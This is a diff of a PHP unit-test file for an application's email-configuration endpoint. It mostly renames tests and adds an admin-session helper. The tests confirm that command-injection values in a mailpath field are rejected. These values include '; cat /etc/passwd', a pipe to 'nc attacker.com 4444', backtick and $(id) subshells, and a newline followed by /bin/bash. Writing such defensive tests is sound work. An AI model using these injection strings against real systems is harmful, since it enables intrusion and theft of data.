@@ -2,12 +2,15 @@
 
 namespace Tests\Controllers;
 
+use CodeIgniter\Config\Services;
 use CodeIgniter\Test\CIUnitTestCase;
 use CodeIgniter\Test\DatabaseTestTrait;
 use CodeIgniter\Test\FeatureTestTrait;
-use CodeIgniter\Config\Services;
 
-class ConfigTest extends CIUnitTestCase
+/**
+ * @internal
+ */
+final class ConfigTest extends CIUnitTestCase
 {
     use DatabaseTestTrait;
     use FeatureTestTrait;
@@ -15,7 +18,7 @@ class ConfigTest extends CIUnitTestCase
     protected $migrate     = true;
     protected $migrateOnce = true;
     protected $refresh     = false;
-    protected $namespace   = null;
+    protected $namespace;
 
     protected function setUp(): void
     {
@@ -30,15 +33,27 @@ class ConfigTest extends CIUnitTestCase
         $session->set('menu_group', 'office');
     }
 
+    /**
+     * Wrapper around FeatureTestTrait::post() that injects the admin
+     * session via withSession() — Services::session() inside the
+     * controller is a different instance from the one resetSession()
+     * writes to, so the controller would otherwise see person_id=NULL
+     * and Secure_Controller::__construct would redirect to /login + exit().
+     */
+    protected function postAsAdmin(string $url, array $data)
+    {
+        return $this
+            ->withSession(['person_id' => 1, 'menu_group' => 'office'])
+            ->post($url, $data);
+    }
+
     // ========== Valid Mailpath Tests ==========
 
-    public function testValidMailpath_AcceptsStandardPath(): void
+    public function testValidMailpathAcceptsStandardPath(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail'
+            'mailpath' => '/usr/sbin/sendmail',
         ]);
 
         $response->assertStatus(200);
@@ -46,13 +61,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertTrue($result['success']);
     }
 
-    public function testValidMailpath_AcceptsPathWithDots(): void
+    public function testValidMailpathAcceptsPathWithDots(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/local/bin/sendmail.local'
+            'mailpath' => '/usr/local/bin/sendmail.local',
         ]);
 
         $response->assertStatus(200);
@@ -60,13 +73,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertTrue($result['success']);
     }
 
-    public function testValidMailpath_AcceptsEmptyStringForNonSendmailProtocol(): void
+    public function testValidMailpathAcceptsEmptyStringForNonSendmailProtocol(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'mail',
-            'mailpath' => ''
+            'mailpath' => '',
         ]);
 
         $response->assertStatus(200);
@@ -74,13 +85,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertTrue($result['success']);
     }
 
-    public function testSendmailProtocol_RequiresMailpath(): void
+    public function testSendmailProtocolRequiresMailpath(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => ''
+            'mailpath' => '',
         ]);
 
         $response->assertStatus(200);
@@ -89,13 +98,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertStringContainsString('invalid', strtolower($result['message']));
     }
 
-    public function testNonSendmailProtocol_RejectsMaliciousMailpath(): void
+    public function testNonSendmailProtocolRejectsMaliciousMailpath(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'smtp',
-            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
+            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd',
         ]);
 
         $response->assertStatus(200);
@@ -106,13 +113,11 @@ class ConfigTest extends CIUnitTestCase
 
     // ========== Command Injection Prevention Tests ==========
 
-    public function testMailpath_RejectsCommandInjection_Semicolon(): void
+    public function testMailpathRejectsCommandInjectionSemicolon(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
+            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd',
         ]);
 
         $response->assertStatus(200);
@@ -121,13 +126,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertStringContainsString('invalid', strtolower($result['message']));
     }
 
-    public function testMailpath_RejectsCommandInjection_Pipe(): void
+    public function testMailpathRejectsCommandInjectionPipe(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail | nc attacker.com 4444'
+            'mailpath' => '/usr/sbin/sendmail | nc attacker.com 4444',
         ]);
 
         $response->assertStatus(200);
@@ -135,13 +138,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_And(): void
+    public function testMailpathRejectsCommandInjectionAnd(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail && whoami'
+            'mailpath' => '/usr/sbin/sendmail && whoami',
         ]);
 
         $response->assertStatus(200);
@@ -149,13 +150,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_Backtick(): void
+    public function testMailpathRejectsCommandInjectionBacktick(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/`whoami`'
+            'mailpath' => '/usr/sbin/`whoami`',
         ]);
 
         $response->assertStatus(200);
@@ -163,13 +162,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_Subshell(): void
+    public function testMailpathRejectsCommandInjectionSubshell(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail$(id)'
+            'mailpath' => '/usr/sbin/sendmail$(id)',
         ]);
 
         $response->assertStatus(200);
@@ -177,13 +174,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_SpaceInPath(): void
+    public function testMailpathRejectsCommandInjectionSpaceInPath(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/sendmail -t -i'
+            'mailpath' => '/usr/sbin/sendmail -t -i',
         ]);
 
         $response->assertStatus(200);
@@ -191,13 +186,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_Newline(): void
+    public function testMailpathRejectsCommandInjectionNewline(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => "/usr/sbin/sendmail\n/bin/bash"
+            'mailpath' => "/usr/sbin/sendmail\n/bin/bash",
         ]);
 
         $response->assertStatus(200);
@@ -205,13 +198,11 @@ class ConfigTest extends CIUnitTestCase
         $this->assertFalse($result['success']);
     }
 
-    public function testMailpath_RejectsCommandInjection_DollarSign(): void
+    public function testMailpathRejectsCommandInjectionDollarSign(): void
     {
-        $this->resetSession();
-
-        $response = $this->post('/config/saveEmail', [
+        $response = $this->postAsAdmin('/config/saveEmail', [
             'protocol' => 'sendmail',
-            'mailpath' => '/usr/sbin/$SENDMAIL'
+            'mailpath' => '/usr/sbin/$SENDMAIL',
         ]);
 
         $response->assertStatus(200);
